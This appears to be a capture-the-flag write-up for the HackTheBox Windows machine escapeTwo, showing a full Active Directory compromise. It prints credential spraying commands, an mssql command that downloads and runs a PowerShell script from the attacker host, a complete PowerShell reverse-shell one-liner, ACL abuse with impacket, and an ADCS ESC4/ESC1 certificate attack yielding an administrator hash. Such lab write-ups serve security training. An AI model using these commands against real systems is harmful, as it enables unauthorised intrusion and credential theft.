---
categories:
- CTF
layout: post
image:
  path: preview.png
media_subpath: /assets/posts/2025-07-01-escapeTwo-hackthebox
tags:
- hackthebox
- windows
- active directory
- acl
title: escapeTwo @ HackTheBox
---
escapeTwo is an easy Windows machine on [hackthebox.eu](https://www.hackthebox.eu). Low privileged user creds are provided from the start. Using these creds on an SMB share provides a corrupted xlsx document, fixing the magic bytes provides several usernames and passwords. Spraying these creds across the network reveals credentials for a 'mssql' account, gaining us initial access. Enumeration of the system reveals 'SQL' credentials, which once sprayed across the domain, allows us to gain access via winrm. Using bloodhound extensively shows write-owner over an account. With this account, we can enumerate 'ADCS', revealing a misconfigured Active Directory Certificate Service. Exploiting this misconfiguration allows us to obtain the administrator hash.

## User & Root Flag
This post is a walkthrough for escapeTwo, an medium machine on [hackthebox.eu](https://www.hackthebox.eu). 

The initial scan (`nmap -Pn -n -sC -sV -p- 10.129.232.128`) shows the following results:
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-02 20:13:12Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-02T20:14:41+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
|_ssl-date: 2025-07-02T20:14:41+00:00; 0s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-07-02T20:14:41+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-07-02T20:11:25
|_Not valid after:  2055-07-02T20:11:25
| ms-sql-ntlm-info: 
|   10.129.232.128:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.129.232.128:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
|_ssl-date: 2025-07-02T20:14:41+00:00; 0s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-02T20:14:41+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
49733/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-07-02T20:14:04
|_  start_date: N/A
```
## Initial Access
Running smbmap shows two unique directorys.
We will ignore the `users` and only focus on `Accounting Department`.
```
┌──(tsunami㉿coffee)-[~]
└─$ smbmap -u rose -p 'KxEPkKe6R8su' -H 10.129.232.128

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                       
[+] IP: 10.129.232.128:445      Name: sequel.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Accounting Department                                   READ ONLY
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
[*] Closed 1 connections 
```
Downloading the files inside of Accounting Department, we find that both files have been corrupted, changing the magicbytes allows us to read the file.<br>
[magicbyte - list of signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)<br>
Look up 'xlsx' and copy the first few magic bytes.
```
hexedit accounts.xlsx
// replace the few characters to: 50 4B 03 04
```
![capture-1](capture-1.PNG)
Opening the file reveals several usernames and passwords.
![capture-2](accounts.PNG)<br>
Use NXC mssql with local-auth to gain access to the account.
```
nxc mssql 10.129.232.128 -u usernames.txt -p passwords.txt -d sequel.htb --local-auth
```
![capture-3](capture-3.PNG)

## mssql
With the mssql account compromised, we can run a local command to gain a reverse shell.
Use a nishang powershell one-liner found: [nishang](https://github.com/samratashok/nishang/tree/master/Shells)
I used: `Invoke-PowerShellTcpOneLine.ps1`
```
nxc mssql 10.129.232.128 -u 'sa'  -p  'MSSQLP@ssw0rd!' --local-auth -X 'IEX(New-Object Net.WebClient).downloadString("http://10.10.16.48:3000/powershell_reverse_tcp.ps1")'
```
![capture-4](capture-4.PNG)
`Skip this if you're still stuck on the reverse shell`
```
# THIS IS THE REVERSE SHELL USED. REMEMBER TO CHANGE THE IP.
$client = New-Object System.Net.Sockets.TCPClient('10.10.16.48',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## sql_svc
After gaining a reverse shell as sql_svc, going to `C:\`, we find a `SQL2019` directory which reveals some credentials.
![capture-5](capture-5.PNG)<br>
Spraying this password across the network reveals a new user.
```
nxc smb 10.129.232.128 -u usernames.txt -p passwords.txt -d sequel.htb --continue-on-success
```
![capture-6](capture-6.PNG)

## Ryan
Looking through bloodhound, Ryan has `WriteOwner` over ca_svc<br>
[WriteOwner by SpecterOps](https://medium.com/@aslam.mahimkar/exploiting-ad-dacl-writeowner-misconfiguration-ca61fb2fcee1)<br>
[Download PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
![capture-7](capture-7.PNG)
Using impackets ownerdit, we can write a new owner for the ca_svc account.
```
impacket-owneredit -action write -new-owner ryan -target ca_svc sequel.htb/ryan:'WqSZAF6CysDQbGb3'
```
![capture-8](capture-8.PNG)
However, we still don't have full control over the account yet.
```
impacket-dacledit -action write -rights FullControl -principal ryan -target ca_svc sequel.htb/ryan:'WqSZAF6CysDQbGb3'
```
![capture-9](capture-9.PNG)
<div style="text-align: center;">
  ⚠️ <strong>READ ME IF STUCK</strong> ⚠️<br>
  If for whatever reason the next step <b>DOES NOT WORK</b>, re-run the previous two steps. AND re-run the dacledit twice.
</div>
<br>
Once we have written our FullControl DACL edit, we can finally create a shadow credential.
```
certipy-ad shadow auto -u "ryan@sequel.htb" -p "WqSZAF6CysDQbGb3" -account "ca_svc" -dc-ip "10.129.232.128"
```

![capture-10](capture-10.PNG)

Using this hash, we can exploit ESC4 (which will turn into ESC1)
```
certipy-ad find -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -stdout -vuln
```
![capture-11](capture-11.PNG)<br>
This verify's that the cert publisher is vulnerable to a ESC4 exploit.
```
certipy-ad template -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -write-default-configuration
```
![capture-12](capture-12.PNG)
We can now request a cert.
```
certipy-ad req -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb -target-ip 10.129.232.128
```
![capture-13](capture-13.PNG)
Using the pfx file, we can request the administrator hash and use it for a PTH attack.
![capture-14](capture-14.PNG)